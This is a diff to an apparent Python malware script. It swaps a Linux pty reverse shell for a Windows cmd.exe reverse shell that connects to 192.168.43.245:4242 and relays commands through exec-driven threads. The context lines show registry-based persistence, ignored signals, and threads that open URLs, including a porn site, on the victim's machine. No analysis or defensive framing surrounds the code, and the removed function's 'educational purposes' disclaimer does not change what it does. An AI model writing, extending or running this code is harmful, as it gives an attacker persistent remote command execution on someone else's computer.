@@ -7,7 +7,7 @@ import signal
 import threading
 import sys
 import socket
-import pty
+import subprocess as sp
 
 def counter(num):
     while True:
@@ -118,31 +118,14 @@ def add_to_registry():
         winreg.CloseKey(registry_key)
     except Exception as e:
         pass
-    
-def reverse_shell(server_ip, server_port):
-    """
-    This function creates a reverse shell connection to the specified server IP and port.
-    WARNING: This script is intended for educational purposes only. Unauthorized use can result in serious legal consequences.
-    Use responsibly and only in environments where you have explicit permission.
-    """
-    # Create a TCP socket using IPv4 and TCP protocol
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Connect the socket to the attacker's server
-    s.connect((server_ip, server_port))
-
-    # Redirect standard input, output, and error streams to the socket
-    os.dup2(s.fileno(), 0)  # Redirect stdin to the socket
-    os.dup2(s.fileno(), 1)  # Redirect stdout to the socket
-    os.dup2(s.fileno(), 2)  # Redirect stderr to the socket
-
-    # Spawn a new shell process and connect it to the socket
-    pty.spawn("/bin/sh")
 
 def signal_handler(signum, frame):
     pass
 
 def launch():
+    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
+    s = socket.socket()
+    s.connect(('192.168.43.245', 4242))
     add_to_registry()
     urls = [
         "https://www.pornhub.com",
@@ -155,8 +138,19 @@ def launch():
     process_creator.start()
     cmd_thread = threading.Thread(target=spawn_my_playground)
     cmd_thread.start()
-    reverse_shell_thread = threading.Thread(target=reverse_shell, args=("192.168.43.245", 1234))
-    reverse_shell_thread.start()
+    threading.Thread(
+    target=exec,
+    args=('while True: '
+          'o = os.read(p.stdout.fileno(), 1024); '
+          's.send(o)', globals()),
+    daemon=True
+    ).start()
+    threading.Thread(
+    target=exec,
+    args=('while True: '
+          'i = s.recv(1024); '
+          'os.write(p.stdin.fileno(), i)', globals())
+    ).start()
     spawn_my_bros(urls)
 
 if __name__ == "__main__":
